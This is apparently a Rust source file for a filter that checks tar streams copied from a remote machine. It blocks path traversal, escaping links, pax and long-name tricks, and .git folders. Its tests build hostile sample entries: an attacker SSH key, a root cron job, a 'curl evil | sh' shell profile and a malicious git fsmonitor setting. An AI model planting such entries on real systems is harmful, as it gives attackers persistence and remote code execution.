//! Checks a copy's tar stream on its way through the app. The machine the
//! files come from was asked to pack some names; this keeps only those, as
//! plain files, folders, and links that stay inside them, so a machine that
//! sends more can't write anything else on the other side (an
//! .ssh/authorized_keys next to the file you copied, say).
//!
//! It follows the tar formats GNU tar and bsdtar write: ustar headers, pax
//! extended headers (including a `size` that overrides the header's, so this
//! and the `tar -x` on the other side agree on where each entry ends) and GNU
//! long names. Anything it can't follow stops the copy rather than being
//! passed on unread.

use std::collections::HashSet;

const BLOCK: usize = 512;
/// The most a pax or GNU long-name header may hold.
const MAX_META: u64 = 1 << 20;

pub struct TarFilter {
    names: Vec<String>,
    /// Leaves out every .git (a workspace pull: its config could run commands here).
    no_git: bool,
    pending: Vec<u8>,
    state: State,
    /// Extended headers (with their data) for the next entry, forwarded with it if it's kept.
    meta: Vec<u8>,
    path: Option<String>,
    link: Option<String>,
    size: Option<u64>,
    /// Files passed so far: a hard link may point at one of these.
    files: HashSet<String>,
    skipped: Vec<String>,
    kept: usize,
    ended: bool,
}

enum State {
    Header,
    /// An entry's data (padding included), forwarded or dropped.
    Data { left: u64, keep: bool },
    /// An extended header's data, read whole before the entry it describes.
    Meta { kind: u8, size: u64, left: u64, data: Vec<u8> },
}

impl TarFilter {
    /// `names`: what the machine was asked to pack, as they appear at the top of the stream.
    pub fn new(names: &[String]) -> TarFilter {
        TarFilter {
            names: names.to_vec(),
            no_git: false,
            pending: Vec::new(),
            state: State::Header,
            meta: Vec::new(),
            path: None,
            link: None,
            size: None,
            files: HashSet::new(),
            skipped: Vec::new(),
            kept: 0,
            ended: false,
        }
    }

    /// Also leaves out anything in or named .git, at any depth.
    pub fn without_git(mut self) -> TarFilter {
        self.no_git = true;
        self
    }

    /// Takes the next bytes of the stream; returns those to pass on.
    pub fn push(&mut self, input: &[u8]) -> Result<Vec<u8>, String> {
        let mut out = Vec::with_capacity(input.len());
        self.pending.extend_from_slice(input);
        let mut at = 0;
        while !self.ended {
            let available = self.pending.len() - at;
            match std::mem::replace(&mut self.state, State::Header) {
                State::Data { left, keep } => {
                    let n = left.min(available as u64) as usize;
                    if keep {
                        out.extend_from_slice(&self.pending[at..at + n]);
                    }
                    at += n;
                    if left > n as u64 {
                        self.state = State::Data { left: left - n as u64, keep };
                        break;
                    }
                }
                State::Meta { kind, size, left, mut data } => {
                    let n = left.min(available as u64) as usize;
                    data.extend_from_slice(&self.pending[at..at + n]);
                    self.meta.extend_from_slice(&self.pending[at..at + n]);
                    at += n;
                    if left > n as u64 {
                        self.state = State::Meta { kind, size, left: left - n as u64, data };
                        break;
                    }
                    data.truncate(size as usize);
                    self.read_meta(kind, &data)?;
                }
                State::Header => {
                    if available < BLOCK {
                        break;
                    }
                    let block: [u8; BLOCK] = self.pending[at..at + BLOCK].try_into().unwrap();
                    at += BLOCK;
                    self.header(&block, &mut out)?;
                }
            }
        }
        if self.ended {
            at = self.pending.len();
        }
        self.pending.drain(..at);
        Ok(out)
    }

    /// The stream ended: the archive's end marker to pass on, or why it's incomplete.
    pub fn finish(&mut self) -> Result<Vec<u8>, String> {
        if !self.ended && (!matches!(self.state, State::Header) || !self.pending.is_empty() || !self.meta.is_empty()) {
            return Err("The files from the other machine stopped in the middle of an entry.".into());
        }
        self.ended = true;
        Ok(vec![0; 2 * BLOCK])
    }

    /// What was left out (as the stream named it).
    pub fn skipped(&self) -> &[String] {
        &self.skipped
    }

    /// How many entries were passed on.
    pub fn kept(&self) -> usize {
        self.kept
    }

    fn header(&mut self, block: &[u8; BLOCK], out: &mut Vec<u8>) -> Result<(), String> {
        if block.iter().all(|&b| b == 0) {
            self.ended = true;
            return Ok(());
        }
        if !checksum_ok(block) {
            return Err("The files from the other machine aren't a valid tar stream.".into());
        }
        let kind = block[156];
        let header_size = number(&block[124..136]).ok_or("The files from the other machine have an unreadable size.")?;
        // A pax size is the next entry's, as tar reads it; extended headers keep their own.
        let size = match kind {
            b'x' | b'L' | b'K' | b'g' => header_size,
            _ => self.size.take().unwrap_or(header_size),
        };
        let padded = size.div_ceil(BLOCK as u64) * BLOCK as u64;
        match kind {
            b'x' | b'L' | b'K' => {
                if size > MAX_META {
                    return Err("The files from the other machine have an oversized header.".into());
                }
                self.meta.extend_from_slice(block);
                self.state = if padded > 0 { State::Meta { kind, size, left: padded, data: Vec::new() } } else { State::Header };
                if padded == 0 {
                    self.read_meta(kind, &[])?;
                }
            }
            // A pax header for the whole archive: not passed on (nothing here needs it).
            b'g' => self.state = if padded > 0 { State::Data { left: padded, keep: false } } else { State::Header },
            // Old GNU sparse files carry extra header blocks this doesn't follow.
            b'S' => return Err("The files from the other machine use a tar format Muxin doesn't copy (GNU sparse files).".into()),
            _ => {
                let ustar = &block[257..263] == b"ustar\0";
                let name = self.path.take().unwrap_or_else(|| match (ustar, field(&block[345..500])) {
                    (true, prefix) if !prefix.is_empty() => format!("{prefix}/{}", field(&block[0..100])),
                    _ => field(&block[0..100]),
                });
                let link = self.link.take().unwrap_or_else(|| field(&block[157..257]));
                let meta = std::mem::take(&mut self.meta);
                let keep = self.allowed(kind, &name, &link);
                if keep {
                    self.kept += 1;
                    out.extend_from_slice(&meta);
                    out.extend_from_slice(block);
                    if matches!(kind, b'0' | 0 | b'7') {
                        self.files.insert(clean(&name).unwrap_or_default().join("/"));
                    }
                } else {
                    self.skipped.push(name);
                }
                self.state = if padded > 0 { State::Data { left: padded, keep } } else { State::Header };
            }
        }
        Ok(())
    }

    fn read_meta(&mut self, kind: u8, data: &[u8]) -> Result<(), String> {
        let text = |d: &[u8]| String::from_utf8_lossy(d.split(|&b| b == 0).next().unwrap_or_default()).into_owned();
        match kind {
            b'L' => self.path = Some(text(data)),
            b'K' => self.link = Some(text(data)),
            _ => {
                for (key, value) in pax_records(data).ok_or("The files from the other machine have an unreadable pax header.")? {
                    match key.as_str() {
                        "path" => self.path = Some(value),
                        "linkpath" => self.link = Some(value),
                        "size" => self.size = Some(value.trim().parse().map_err(|_| "The files from the other machine have an unreadable size.")?),
                        _ => {}
                    }
                }
            }
        }
        Ok(())
    }

    /// Plain files and folders under the names asked for; links only to
    /// something inside the same one.
    fn allowed(&self, kind: u8, name: &str, link: &str) -> bool {
        let Some(parts) = clean(name) else { return false };
        if parts.is_empty() || !self.names.iter().any(|n| n == parts[0]) {
            return false;
        }
        if self.no_git && parts.contains(&".git") {
            return false;
        }
        match kind {
            b'0' | 0 | b'7' | b'5' => true,
            b'2' => link_stays_inside(&parts, link),
            b'1' => clean(link).is_some_and(|l| self.files.contains(&l.join("/"))),
            _ => false,
        }
    }
}

/// A path's parts without "." ones; None for an absolute one or one with "..".
fn clean(path: &str) -> Option<Vec<&str>> {
    if path.starts_with('/') {
        return None;
    }
    let parts: Vec<&str> = path.split('/').filter(|p| !p.is_empty() && *p != ".").collect();
    (!parts.contains(&"..")).then_some(parts)
}

/// Whether a link at `parts` pointing at `target` resolves inside the
/// top-level name it's under (never above it, never absolute). A link that is
/// the top-level name itself points elsewhere, so it isn't kept.
fn link_stays_inside(parts: &[&str], target: &str) -> bool {
    if target.is_empty() || target.starts_with('/') {
        return false;
    }
    let mut at: Vec<&str> = parts[..parts.len() - 1].to_vec();
    for p in target.split('/') {
        match p {
            "" | "." => {}
            ".." => {
                if at.len() <= 1 {
                    return false;
                }
                at.pop();
            }
            p => at.push(p),
        }
    }
    at.first() == parts.first()
}

/// A header field: the text up to its first NUL.
fn field(bytes: &[u8]) -> String {
    String::from_utf8_lossy(bytes.split(|&b| b == 0).next().unwrap_or_default()).into_owned()
}

/// A numeric header field: octal text, or GNU's base-256 for big values.
fn number(bytes: &[u8]) -> Option<u64> {
    if bytes[0] & 0x80 != 0 {
        if bytes[0] & 0x40 != 0 {
            return None; // negative
        }
        let mut n: u64 = (bytes[0] & 0x3f) as u64;
        for &b in &bytes[1..] {
            n = n.checked_mul(256)?.checked_add(b as u64)?;
        }
        return Some(n);
    }
    let text = std::str::from_utf8(bytes).ok()?.trim_matches(|c: char| c == '\0' || c == ' ');
    if text.is_empty() {
        return Some(0);
    }
    u64::from_str_radix(text, 8).ok()
}

fn checksum_ok(block: &[u8; BLOCK]) -> bool {
    let Some(want) = number(&block[148..156]) else { return false };
    let (mut unsigned, mut signed) = (0u64, 0i64);
    for (i, &b) in block.iter().enumerate() {
        let b = if (148..156).contains(&i) { b' ' } else { b };
        unsigned += b as u64;
        signed += b as i8 as i64;
    }
    want == unsigned || want as i64 == signed
}

/// pax records: "<length> <key>=<value>\n", repeated.
fn pax_records(mut data: &[u8]) -> Option<Vec<(String, String)>> {
    let mut records = Vec::new();
    while !data.is_empty() && data[0] != 0 {
        let space = data.iter().position(|&b| b == b' ')?;
        let len: usize = std::str::from_utf8(&data[..space]).ok()?.parse().ok()?;
        if len <= space + 1 || len > data.len() || data[len - 1] != b'\n' {
            return None;
        }
        let record = &data[space + 1..len - 1];
        let eq = record.iter().position(|&b| b == b'=')?;
        records.push((String::from_utf8_lossy(&record[..eq]).into_owned(), String::from_utf8_lossy(&record[eq + 1..]).into_owned()));
        data = &data[len..];
    }
    Some(records)
}

#[cfg(test)]
mod tests {
    use super::*;

    /// One ustar header (and its data) the way tar writes it.
    fn entry(name: &str, kind: u8, link: &str, data: &[u8]) -> Vec<u8> {
        let mut h = [0u8; BLOCK];
        h[..name.len()].copy_from_slice(name.as_bytes());
        h[100..107].copy_from_slice(b"0000644");
        h[108..115].copy_from_slice(b"0000000");
        h[116..123].copy_from_slice(b"0000000");
        h[124..135].copy_from_slice(format!("{:011o}", data.len()).as_bytes());
        h[136..147].copy_from_slice(b"00000000000");
        h[156] = kind;
        h[157..157 + link.len()].copy_from_slice(link.as_bytes());
        h[257..263].copy_from_slice(b"ustar\0");
        h[263..265].copy_from_slice(b"00");
        h[148..156].copy_from_slice(b"        ");
        let sum: u32 = h.iter().map(|&b| b as u32).sum();
        h[148..155].copy_from_slice(format!("{sum:06o}\0").as_bytes());
        let mut out = h.to_vec();
        out.extend_from_slice(data);
        out.resize(out.len().div_ceil(BLOCK) * BLOCK, 0);
        out
    }

    fn pax(records: &[(&str, &str)]) -> Vec<u8> {
        let mut body = Vec::new();
        for (k, v) in records {
            let rest = format!(" {k}={v}\n");
            let mut len = rest.len() + 1;
            while format!("{len}{rest}").len() != len {
                len += 1;
            }
            body.extend_from_slice(format!("{len}{rest}").as_bytes());
        }
        entry("./PaxHeaders/x", b'x', "", &body)
    }

    /// Runs a stream through the filter in odd-sized pieces, like the link delivers it.
    fn filter(names: &[&str], stream: &[u8]) -> (Vec<u8>, Vec<String>) {
        let mut f = TarFilter::new(&names.iter().map(|s| s.to_string()).collect::<Vec<_>>());
        let mut out = Vec::new();
        for chunk in stream.chunks(733) {
            out.extend(f.push(chunk).unwrap());
        }
        out.extend(f.finish().unwrap());
        (out, f.skipped().to_vec())
    }

    /// The names a real `tar -t` lists in a stream.
    fn listed(stream: &[u8]) -> Vec<String> {
        use std::io::Write;
        let mut child = std::process::Command::new("tar")
            .arg("-tf")
            .arg("-")
            .stdin(std::process::Stdio::piped())
            .stdout(std::process::Stdio::piped())
            .spawn()
            .unwrap();
        child.stdin.take().unwrap().write_all(stream).unwrap();
        let out = child.wait_with_output().unwrap();
        String::from_utf8_lossy(&out.stdout).lines().map(|l| l.trim_end_matches('/').to_string()).collect()
    }

    #[test]
    fn keeps_what_was_asked_for() {
        let mut s = entry("./app/", b'5', "", b"");
        s.extend(entry("./app/run.sh", b'0', "", b"echo hi\n"));
        s.extend(entry("./app/current", b'2', "run.sh", b""));
        s.extend(entry("./app/again", b'1', "./app/run.sh", b""));
        s.extend(entry("./notes.txt", b'0', "", &vec![b'x'; 5000]));
        s.extend([0u8; 1024]);
        let (out, skipped) = filter(&["app", "notes.txt"], &s);
        assert!(skipped.is_empty(), "{skipped:?}");
        assert_eq!(out, s);
        assert_eq!(listed(&out), ["./app", "./app/run.sh", "./app/current", "./app/again", "./notes.txt"]);
    }

    #[test]
    fn drops_everything_else() {
        let mut s = entry("./app/ok", b'0', "", b"fine\n");
        for bad in [
            entry("./.ssh/authorized_keys", b'0', "", b"ssh-ed25519 AAAA attacker\n"),
            entry("/etc/cron.d/x", b'0', "", b"* * * * * root sh\n"),
            entry("./app/../.zshrc", b'0', "", b"curl evil | sh\n"),
            entry("./app/home", b'2', "/home/user", b""),
            entry("./app/up", b'2', "../../.ssh", b""),
            entry("./app", b'2', "elsewhere", b""),
            entry("./app/hard", b'1', "./.ssh/authorized_keys", b""),
            entry("./app/disk", b'4', "", b""),
            entry("./application/x", b'0', "", b"not app\n"),
        ] {
            s.extend(bad);
        }
        s.extend([0u8; 1024]);
        let (out, skipped) = filter(&["app"], &s);
        assert_eq!(listed(&out), ["./app/ok"]);
        assert_eq!(skipped.len(), 9, "{skipped:?}");
    }

    #[test]
    fn follows_pax_and_gnu_names_and_sizes() {
        // A pax path moves an innocent-looking entry somewhere else: judged by the pax path.
        let mut s = pax(&[("path", ".ssh/authorized_keys")]);
        s.extend(entry("./app/readme", b'0', "", b"key\n"));
        // A GNU long name, the same way.
        s.extend(entry("././@LongLink", b'L', "", b"./.bashrc\0"));
        s.extend(entry("./app/x", b'0', "", b"evil\n"));
        // A pax size larger than the header's: what looks like data to the header
        // is a hidden entry to tar; this must skip it as data too.
        let hidden = entry("./.profile", b'0', "", b"evil\n");
        s.extend(pax(&[("size", &hidden.len().to_string())]));
        s.extend(entry("./app/blob", b'0', "", b""));
        s.extend(&hidden);
        // A long name inside the folder is fine.
        let long = format!("./app/{}", "d/".repeat(80) + "f.txt");
        s.extend(pax(&[("path", &long)]));
        s.extend(entry("./app/short", b'0', "", b"ok\n"));
        s.extend([0u8; 1024]);
        let (out, skipped) = filter(&["app"], &s);
        assert_eq!(listed(&out), ["./app/blob".to_string(), long]);
        assert_eq!(skipped, [".ssh/authorized_keys", "./.bashrc"]);
    }

    #[test]
    fn a_real_tar_stream_passes_unchanged() {
        let dir = std::env::temp_dir().join(format!("muxen-tar-filter-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let deep = dir.join("proj").join("a".repeat(60)).join("b".repeat(60));
        std::fs::create_dir_all(&deep).unwrap();
        std::fs::write(deep.join("c".repeat(80) + ".txt"), "long name\n").unwrap();
        std::fs::write(dir.join("proj/data.bin"), vec![7u8; 300_000]).unwrap();
        std::fs::create_dir_all(dir.join("proj/empty")).unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink("data.bin", dir.join("proj/link")).unwrap();
        let out = std::process::Command::new("tar").env("COPYFILE_DISABLE", "1").arg("-C").arg(&dir).args(["-cf", "-", "./proj"]).output().unwrap();
        assert!(out.status.success());
        let (filtered, skipped) = filter(&["proj"], &out.stdout);
        assert!(skipped.is_empty(), "{skipped:?}");
        assert_eq!(listed(&filtered), listed(&out.stdout));
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn a_workspace_pull_leaves_out_every_git_folder() {
        let mut s = entry("./src/main.rs", b'0', "", b"fn main() {}\n");
        s.extend(entry("./vendor/lib/.git/config", b'0', "", b"[core]\n\tfsmonitor = evil\n"));
        s.extend(entry("./vendor/lib/.git", b'0', "", b"gitdir: ../../.git/modules/lib\n"));
        s.extend(entry("./vendor/lib/ok.c", b'0', "", b"int x;\n"));
        s.extend([0u8; 1024]);
        let names = ["src".to_string(), "vendor".to_string()];
        let mut f = TarFilter::new(&names).without_git();
        let mut out = f.push(&s).unwrap();
        out.extend(f.finish().unwrap());
        assert_eq!(listed(&out), ["./src/main.rs", "./vendor/lib/ok.c"]);
        // A plain copy keeps them: it's what the user asked for.
        let (out, _) = filter(&["src", "vendor"], &s);
        assert_eq!(listed(&out).len(), 4);
    }

    #[test]
    fn a_cut_off_stream_is_an_error() {
        let s = entry("./app/big", b'0', "", &vec![1u8; 2000]);
        let mut f = TarFilter::new(&["app".to_string()]);
        f.push(&s[..1000]).unwrap();
        assert!(f.finish().is_err());
        let mut f = TarFilter::new(&["app".to_string()]);
        let mut bad = entry("./app/x", b'0', "", b"");
        bad[150] ^= 1;
        assert!(f.push(&bad).is_err());
    }
}
